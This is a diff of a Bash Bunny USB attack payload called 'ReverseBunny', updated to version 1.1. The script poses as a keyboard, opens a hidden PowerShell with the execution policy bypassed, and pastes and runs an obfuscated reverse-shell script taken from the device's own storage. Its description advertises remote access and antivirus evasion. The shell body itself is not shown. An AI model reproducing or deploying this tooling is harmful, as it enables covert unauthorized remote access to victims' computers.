@@ -1,29 +1,54 @@
+#!/bin/bash
+#
 # Title:         ReverseBunny
-# Description:   Obfuscated reverse shell, executed via powershell
+# Description:   Get remote access using obfuscated powershell code - If caught by AV, feel free to contact me.
 # Author:        0iphor13
-# Version:       1.0
-# Category:      Execution
+# Version:       1.1
+# Category:      Remote_Access
 # Attackmodes:   HID, Storage
 
+LED SETUP
+
 GET SWITCH_POSITION
-ATTACKMODE HID STORAGE
 DUCKY_LANG de
 
-#LED RED - DON'T EJECT - PAYLOAD RUNNING
+rm /root/udisk/DONE
 
-LED R FAST
+ATTACKMODE HID STORAGE
+
+#LED STAGE1 - DON'T EJECT - PAYLOAD RUNNING
+
+LED STAGE1
 
 DELAY 5000
-RUN WIN "powershell -NoP -W hidden -NonI -Exec Bypass"
-DELAY 2000
+RUN WIN "powershell -NoP -NonI -W hidden -Exec Bypass"
+DELAY 6000
 
-Q STRING "Set-Clipboard -Value (gc((gwmi win32_volume -f 'label=''BashBunny''').Name+'\payloads\\$SWITCH_POSITION\ReverseBunny.txt'))"
-DELAY 5000
+Q STRING "Set-Clipboard -Value (gc((gwmi win32_volume -f 'label=''BashBunny''').Name+'\payloads\\$SWITCH_POSITION\RevBunny.txt'))"
+DELAY 10000
 Q ENTER
-DELAY 5000
+DELAY 10000
 Q CONTROL v
-DELAY 5000
+DELAY 10000
 Q ENTER
+DELAY 1000
+
+LED STAGE2
+
+until  [ -f /root/udisk/DONE ]
+	do
+	sleep 0.2
+done
+
+LED CLEANUP
+
+rm /root/udisk/DONE
+
+DELAY 100
+
+sync
+
+DELAY 100
 
 LED FINISH
 
